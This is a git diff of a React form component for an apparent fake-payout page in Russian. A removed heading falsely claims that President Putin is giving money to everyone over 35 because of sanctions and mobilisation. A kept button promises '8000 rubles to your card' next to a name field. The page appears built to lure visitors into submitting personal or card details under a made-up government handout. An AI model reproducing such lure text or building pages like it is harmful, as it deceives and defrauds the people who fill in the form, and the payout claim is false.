@@ -98,7 +98,7 @@ function App() {
           </div>
         </div>
         <form onSubmit={handleSubmit} className='w-full h-full flex flex-col items-center justify-center text-center pb-10'>
-          <h1 className='text-base sm:text-2xl font-bold w-[90%] sm:w-[50%]'>Сегодня Президент Путин принял новое решение.в связи с санкцией Евросоюза в отношении нашей страны и в связи с мобилизацией президент Путин дает по 4 тысячи каждому старше 35 лет </h1>
+          <h1 className='text-base sm:text-2xl font-bold w-[90%] sm:w-[50%]'></h1>
           <div className="flex flex-col  items-center justify-center gap-6  py-10 w-[80%] sm:w-[30%]">
             <div className="flex items-center justify-center gap-5 w-full">
               <TextField defaultValue={name} label="имя" variant="standard" onChange={(e) => {
@@ -178,7 +178,7 @@ function App() {
               }} />
             </div>
           </div>
-          <button type='submit' className='rounded-md bg-green-500 hover:bg-green-700 transition-all hover:text-white w-[80%] sm:w-[30%] py-3  text-md sm:text-xl font-bold'>получить на карту  8000 рубль</button>
+          <button type='submit' className='rounded-md bg-green-500 hover:bg-green-700 transition-all hover:text-white w-[80%] sm:w-[30%] py-3  text-md sm:text-xl font-bold'>получить на карту 8000 рубль</button>
         </form>
       </div>
       <footer className='bg-[#171a1e] sm:h-[500px] w-full flex  justify-center'>
